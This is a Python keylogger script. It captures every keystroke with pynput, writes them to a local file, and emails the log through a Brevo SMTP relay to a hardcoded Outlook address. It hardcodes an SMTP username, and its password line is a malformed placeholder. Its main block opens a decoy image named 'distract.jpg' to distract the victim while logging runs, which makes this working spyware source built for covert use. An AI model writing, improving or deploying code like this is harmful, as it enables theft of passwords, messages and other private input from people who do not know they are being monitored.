import os
from pynput import keyboard
from datetime import datetime
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Brevo SMTP credentials
EMAIL_ADDRESS = "keyloggymckeyloggyface@outlook.com"
TO_EMAIL = EMAIL_ADDRESS
SMTP_SERVER = "smtp-relay.brevo.com"
SMTP_PORT = 587
SMTP_USERNAME = "9d7474001@smtp-brevo.com"
SMTP_PASSWORD = #PLACEHOLDER PASSWORD. DO NOT REVEAL ON GITHUB""

TXT_FILE = "keyfile.txt"

def send_file_contents():
    # Read file contents
    with open(TXT_FILE, "r") as f:
        contents = f.read().strip()
    
    if not contents:
        print("No new content to send.")
        return
    
    # Create email
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL
    msg['Subject'] = "Automated TXT File Update"
    msg.attach(MIMEText(contents, 'plain'))
    
    # Send email via Brevo SMTP
    try:
        print("Connecting to Brevo SMTP server...")
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10)
        server.set_debuglevel(1)  # Show detailed debug info
        server.starttls()
        
        print("Logging in...")
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        
        print("Sending email...")
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
        
        server.quit()
        print("✓ Email sent successfully!")
        
    except smtplib.SMTPAuthenticationError:
        print("✗ Authentication failed. Check your login and SMTP key.")
        return
    except Exception as e:
        print(f"✗ Error occurred: {e}")
        return
    
    # Clear file after sending
    with open(TXT_FILE, "w") as f:
        f.write("")

# Run the function
send_file_contents()

# Keep window open to see errors
input("\nPress Enter to close...")

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.tab:
                logKey.write('\t')
            else:
                logKey.write(f'[{key.name}]')



if __name__ == "__main__":
    # Opens the image 
    os.startfile("distract.jpg")  

    # Start the keylogger
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    # send txt file
    send_file_contents()
    time.sleep(1)
